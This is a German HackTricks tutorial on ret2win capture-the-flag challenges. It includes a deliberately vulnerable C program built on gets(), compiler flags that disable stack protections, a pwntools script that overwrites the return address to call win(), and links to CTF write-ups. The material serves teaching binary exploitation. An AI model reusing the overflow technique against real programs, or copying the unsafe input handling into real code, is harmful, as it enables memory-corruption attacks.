# Ret2win

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

## Grundlegende Informationen

**Ret2win**-Herausforderungen sind eine beliebte Kategorie in **Capture The Flag (CTF)**-Wettbewerben, insbesondere bei Aufgaben, die **bin√§re Ausnutzung** beinhalten. Das Ziel besteht darin, eine Schwachstelle in einem gegebenen Bin√§rfile auszunutzen, um eine bestimmte, nicht aufgerufene Funktion innerhalb des Bin√§rfiles auszuf√ºhren, die oft etwas wie `win`, `flag` usw. genannt wird. Diese Funktion gibt normalerweise eine Flagge oder eine Erfolgsmeldung aus, wenn sie ausgef√ºhrt wird. Die Herausforderung beinhaltet in der Regel das √úberschreiben der **R√ºckkehradresse** auf dem Stack, um den Ausf√ºhrungsfluss zur gew√ºnschten Funktion umzuleiten. Hier ist eine detailliertere Erkl√§rung mit Beispielen:

### C-Beispiel

Betrachten Sie ein einfaches C-Programm mit einer Schwachstelle und einer `win`-Funktion, die wir aufrufen m√∂chten:
```c
#include <stdio.h>
#include <string.h>

void win() {
printf("Congratulations! You've called the win function.\n");
}

void vulnerable_function() {
char buf[64];
gets(buf); // This function is dangerous because it does not check the size of the input, leading to buffer overflow.
}

int main() {
vulnerable_function();
return 0;
}
```
Um dieses Programm ohne Stack-Schutz und mit deaktiviertem **ASLR** zu kompilieren, k√∂nnen Sie den folgenden Befehl verwenden:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
* `-m32`: Kompiliere das Programm als 32-Bit-Bin√§rdatei (dies ist optional, aber √ºblich bei CTF-Herausforderungen).
* `-fno-stack-protector`: Deaktiviere Schutzma√ünahmen gegen Stack-√úberl√§ufe.
* `-z execstack`: Erlaube die Ausf√ºhrung von Code auf dem Stack.
* `-no-pie`: Deaktiviere Position Independent Executable, um sicherzustellen, dass die Adresse der `win`-Funktion nicht ge√§ndert wird.
* `-o vulnerable`: Benenne die Ausgabedatei als `vulnerable`.

### Python-Exploit mit Pwntools

F√ºr den Exploit verwenden wir **pwntools**, ein leistungsstarkes CTF-Framework zum Schreiben von Exploits. Das Exploit-Skript wird ein Payload erstellen, um den Puffer zu √ºberlaufen und die R√ºcksprungadresse mit der Adresse der `win`-Funktion zu √ºberschreiben.
```python
from pwn import *

# Set up the process and context for the binary
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path

# Find the address of the win function
win_addr = p32(0x08048456)  # Replace 0x08048456 with the actual address of the win function in your binary

# Create the payload
# The buffer size is 64 bytes, and the saved EBP is 4 bytes. Hence, we need 68 bytes before we overwrite the return address.
payload = b'A' * 68 + win_addr

# Send the payload
p.sendline(payload)
p.interactive()
```
Um die Adresse der `win`-Funktion zu finden, k√∂nnen Sie **gdb**, **objdump** oder ein anderes Tool verwenden, das es Ihnen erm√∂glicht, Bin√§rdateien zu inspizieren. Zum Beispiel k√∂nnten Sie mit `objdump` folgendes verwenden:
```sh
objdump -d vulnerable | grep win
```
Dieser Befehl zeigt Ihnen die Assembly des `win`-Funktion, einschlie√ülich ihrer Startadresse.

Das Python-Skript sendet eine sorgf√§ltig erstellte Nachricht, die, wenn sie von der `vulnerable_function` verarbeitet wird, den Puffer √ºberl√§uft und die R√ºckkehradresse auf dem Stapel mit der Adresse von `win` √ºberschreibt. Wenn `vulnerable_function` zur√ºckkehrt, anstatt zu `main` zur√ºckzukehren oder zu beenden, springt es zu `win`, und die Nachricht wird gedruckt.

## Schutzma√ünahmen

* **PIE** sollte deaktiviert sein, damit die Adresse bei verschiedenen Ausf√ºhrungen zuverl√§ssig ist, oder die Adresse, an der die Funktion gespeichert wird, ist nicht immer gleich, und Sie br√§uchten ein Leck, um herauszufinden, wo die win-Funktion geladen ist. In einigen F√§llen, wenn die Funktion, die den √úberlauf verursacht, `read` oder √§hnlich ist, k√∂nnen Sie eine **teilweise √úberschreibung** von 1 oder 2 Bytes durchf√ºhren, um die R√ºckkehradresse auf die win-Funktion zu √§ndern. Aufgrund der Funktionsweise von ASLR sind die letzten drei Hex-Nibbles nicht zuf√§llig, sodass es eine **1/16-Chance** (1 Nibble) gibt, die richtige R√ºckkehradresse zu erhalten.
* **Stack Canaries** sollten ebenfalls deaktiviert sein, da die kompromittierte EIP-R√ºckkehradresse niemals befolgt wird.

## Weitere Beispiele & Referenzen

* [https://ir0nstone.gitbook.io/notes/types/stack/ret2win](https://ir0nstone.gitbook.io/notes/types/stack/ret2win)
* [https://guyinatuxedo.github.io/04-bof\_variable/tamu19\_pwn1/index.html](https://guyinatuxedo.github.io/04-bof\_variable/tamu19\_pwn1/index.html)
* 32-Bit, kein ASLR
* [https://guyinatuxedo.github.io/05-bof\_callfunction/csaw16\_warmup/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/csaw16\_warmup/index.html)
* 64-Bit mit ASLR, mit einem Leck der Bin-Adresse
* [https://guyinatuxedo.github.io/05-bof\_callfunction/csaw18\_getit/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/csaw18\_getit/index.html)
* 64-Bit, kein ASLR
* [https://guyinatuxedo.github.io/05-bof\_callfunction/tu17\_vulnchat/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/tu17\_vulnchat/index.html)
* 32-Bit, kein ASLR, doppelter kleiner √úberlauf, zuerst um den Stapel zu √ºberlaufen und die Gr√∂√üe des zweiten √úberlaufs zu vergr√∂√üern
* [https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html)
* 32-Bit, relro, kein Canary, nx, kein PIE, Formatzeichenfolge zum √úberschreiben der Adresse `fflush` mit der win-Funktion (ret2win)
* [https://guyinatuxedo.github.io/15-partial\_overwrite/tamu19\_pwn2/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/tamu19\_pwn2/index.html)
* 32-Bit, nx, nichts anderes, teilweise √úberschreibung von EIP (1 Byte), um die win-Funktion aufzurufen
* [https://guyinatuxedo.github.io/15-partial\_overwrite/tuctf17\_vulnchat2/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/tuctf17\_vulnchat2/index.html)
* 32-Bit, nx, nichts anderes, teilweise √úberschreibung von EIP (1 Byte), um die win-Funktion aufzurufen
* [https://guyinatuxedo.github.io/35-integer\_exploitation/int\_overflow\_post/index.html](https://guyinatuxedo.github.io/35-integer\_exploitation/int\_overflow\_post/index.html)
* Das Programm validiert nur das letzte Byte einer Zahl, um die Gr√∂√üe der Eingabe zu √ºberpr√ºfen. Daher ist es m√∂glich, jede Gr√∂√üe hinzuzuf√ºgen, solange das letzte Byte im erlaubten Bereich liegt. Dann f√ºhrt die Eingabe einen Puffer√ºberlauf aus, der mit einem ret2win ausgenutzt wird.
* [https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/](https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/)
* 64-Bit, relro, kein Canary, nx, PIE. Teilweise √úberschreibung, um die win-Funktion aufzurufen (ret2win)
* [https://8ksec.io/arm64-reversing-and-exploitation-part-3-a-simple-rop-chain/](https://8ksec.io/arm64-reversing-and-exploitation-part-3-a-simple-rop-chain/)
* ARM64, PIE, es gibt ein PIE-Leck, die win-Funktion besteht tats√§chlich aus 2 Funktionen, sodass ein ROP-Gadget, das 2 Funktionen aufruft
* [https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/](https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/)
* ARM64, Off-by-One, um eine win-Funktion aufzurufen

## ARM64 Beispiel

{% content-ref url="ret2win-arm64.md" %}
[ret2win-arm64.md](ret2win-arm64.md)
{% endcontent-ref %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>
